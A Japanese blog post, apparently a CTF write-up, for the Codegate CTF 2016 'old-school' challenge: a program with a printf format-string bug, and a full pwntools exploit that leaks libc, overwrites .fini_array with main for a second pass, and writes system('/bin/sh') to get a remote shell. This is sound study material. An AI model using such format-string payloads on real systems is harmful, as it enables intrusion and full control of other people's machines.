---
layout: post
alias: "/blog/2017/01/20/codegate-ctf-2016-old-school/"
date: "2017-01-20T16:12:06+09:00"
title: "Codegate CTF 2016 : old-school"
tags: [ "ctf", "writeup", "pwn", "codegate-ctf", "fini_array", "format-string-attack" ]
"target_url": [ "https://github.com/ctfs/write-ups-2016/tree/master/codegate-ctf-2016/pwn/old-school" ]
---

`.fini_array`を忘れて「stackのaddress総当たりか？」とか言ってた。

## problem

バイナリ,ソースコード,libcのが全部与えられる。

特にコード(整形済み)は以下。

``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char buf[1024] = { 0, };
    printf( "YOUR INPUT :" );
    fgets( buf, 1020, stdin );
    printf( "RESPONSE :" );
    printf( buf );
    return 0;
}
```

## solution

自明なstring-format bugがあるが、一度しか踏めない。
まずstack上からlibcやstackのaddressを回収しつつ`.fini_array`に`main`を書き込む。
これにより$2$回目を作り、再度ROP chainを書き込んで`system("/bin/sh")`。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='175.119.158.131')
parser.add_argument('port', nargs='?', default=17171, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--libc', default='libc-2.21.so')
args = parser.parse_args()
context.log_level = args.log_level

elf = ELF('./oldschool')
libc = ELF(args.libc)

# with process('./oldschool') as p:
with remote(args.host, args.port) as p:
    # first payload
    fini_array, = filter(lambda x: x.name == '.fini_array', elf.sections)
    data = map(ord, p32(elf.symbols['main']))
    log.info('.fini_array: %#x', fini_array.header.sh_addr)
    addr = fini_array.header.sh_addr
    offset = 7 + 17
    payload = ''
    payload += '%267$255p ' # %7$x
    payload += '%264$255p '
    payload += '%{}c%{}$hhn'.format((data[0]           - 1) % 256 + 1, offset    )
    payload += '%{}c%{}$hhn'.format((data[1] - data[0] - 1) % 256 + 1, offset + 1)
    payload += '%{}c%{}$hhn'.format((data[2] - data[1] - 1) % 256 + 1, offset + 2)
    payload += '%{}c%{}$hhn'.format((data[3] - data[2] - 1) % 256 + 1, offset + 3)
    payload += ' ' * ((- len(payload)) % 4)
    assert offset == len(payload) / 4 + 7
    payload += p32(addr    )
    payload += p32(addr + 1)
    payload += p32(addr + 2)
    payload += p32(addr + 3)
    payload += '%4096c' # to flush
    log.info('payload: %s', repr(payload))

    # p.recvuntil('YOUR INPUT :')
    p.sendline(payload)
    p.recvuntil('RESPONSE :')
    # s = p.recvline()
    s = p.recv(2000)
    libc_start_main = int(s.split()[0], 16) - 247
    log.info('__libc_start_main: %#x', libc_start_main)
    libc_base = libc_start_main - libc.symbols['__libc_start_main']
    log.info('libc base: %#x', libc_base)
    return_addr = int(s.split()[1], 16) - 20
    log.info('return addr: %#x', return_addr)

    # second payload
    log.info('system: %#x',  libc_base + libc.symbols['system'])
    log.info('/bin/sh: %#x', libc_base + next(libc.search('/bin/sh')))
    data = []
    data += map(ord, p32(libc_base + libc.symbols['system']))
    data += map(ord, p32(libc_base + next(libc.search('/bin/sh'))))
    for delta in range(-2, 2+1):
        offset = 7 + 23 + delta
        payload = ''
        payload += '%{}c%{}$hhn'.format((data[0]           - 1) % 256 + 1, offset    )
        payload += '%{}c%{}$hhn'.format((data[1] - data[0] - 1) % 256 + 1, offset + 1)
        payload += '%{}c%{}$hhn'.format((data[2] - data[1] - 1) % 256 + 1, offset + 2)
        payload += '%{}c%{}$hhn'.format((data[3] - data[2] - 1) % 256 + 1, offset + 3)
        payload += '%{}c%{}$hhn'.format((data[4] - data[3] - 1) % 256 + 1, offset + 4)
        payload += '%{}c%{}$hhn'.format((data[5] - data[4] - 1) % 256 + 1, offset + 5)
        payload += '%{}c%{}$hhn'.format((data[6] - data[5] - 1) % 256 + 1, offset + 6)
        payload += '%{}c%{}$hhn'.format((data[7] - data[6] - 1) % 256 + 1, offset + 7)
        payload += ' ' * ((- len(payload)) % 4)
        if offset != len(payload) / 4 + 7:
            continue
        addr = return_addr - 208
        payload += p32(addr    )
        payload += p32(addr + 1)
        payload += p32(addr + 2)
        payload += p32(addr + 3)
        addr = return_addr - 208 + 8
        payload += p32(addr    )
        payload += p32(addr + 1)
        payload += p32(addr + 2)
        payload += p32(addr + 3)
        break
    else:
        assert False

    # p.recvuntil('YOUR INPUT :')
    p.sendline(payload)
    # p.recvuntil('RESPONSE :')

    time.sleep(1)
    p.sendline('id')
    p.interactive()
```
